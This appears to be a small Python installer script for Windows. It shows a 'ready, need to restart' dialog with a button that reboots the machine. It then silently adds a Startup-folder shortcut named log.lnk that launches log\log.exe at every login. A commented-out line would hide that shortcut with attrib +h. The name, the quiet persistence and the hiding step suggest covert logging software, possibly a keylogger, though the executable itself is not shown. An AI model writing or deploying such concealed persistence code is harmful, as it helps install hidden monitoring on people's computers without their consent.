import os
import winshell
from tkinter import *

# cpp = os.getcwd()
cpp = os.path.dirname(os.getcwd())

def restart():
    win = Tk()
    win.iconbitmap(f"{cpp}/file.ico")
    win.geometry("320x100")
    win.resizable(False, False)
    win.title("Restart")
    fr = Frame(win)
    Label(fr,text="💫 Everything is ready for you, Need to restart.",font="lucid 10 bold").pack(side="left",padx=10)
    fr.pack(pady=10)
    fr2 = Frame(win)
    Button(fr2,text="Not now",width=15,pady=5,command=win.destroy).pack(side="left",padx=10)
    Button(fr2,text="Restart",width=15,pady=5,command=lambda :os.system("shutdown /r")).pack(side="left",padx=10)
    fr2.pack(fill="x",padx=20,pady=5)
    
    win.mainloop()
    
restart()

desktop = winshell.startup()
path = os.path.join(desktop, 'log.lnk')
# Set the target path (e.g., path to an executable or script)
target = f'{cpp}\log\log.exe'

# Create the shortcut
winshell.CreateShortcut(
    Path=path,
    Target=target,
    StartIn=f"{cpp}\log",
    Description="developer--@techie_31",
)

# todo hiding the login
# os.system(f'attrib +h "{path}"')